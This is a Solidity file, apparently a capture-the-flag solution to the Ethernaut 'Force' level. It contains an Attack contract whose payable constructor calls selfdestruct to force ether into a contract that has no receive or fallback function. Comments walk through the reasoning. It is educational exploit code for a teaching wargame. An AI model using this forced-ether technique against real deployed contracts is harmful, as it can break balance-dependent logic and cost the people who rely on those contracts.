// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


//////// @title Solution Force
/// @author  Yash Patel

// Q.] we have an empty contract and we have to send the ether to that contract.
// => Here we have an empty contract with no function no variable no fallback no receive
// => If we directly send the ether to this contract will not get the ether
// => WE have to use a contract which contains a selfdestruct function
// => So We will create a contract and send some amount of wei at the time of deployment for that we have to make constructor payable 
// => So that It can get that ether which we send during deployment
// => And inside the constructor we will call the selfdestruct function which will destroy the contract and send the balance of this contract to the Force contract or the address which we mention
// => Hence we send the ether to the Force contract 
contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }




contract Attack {
// Adding payable while declaring address make it eligible for sending and receiving ether.
    constructor(address payable _force) payable{
        selfdestruct(_force);
    }
}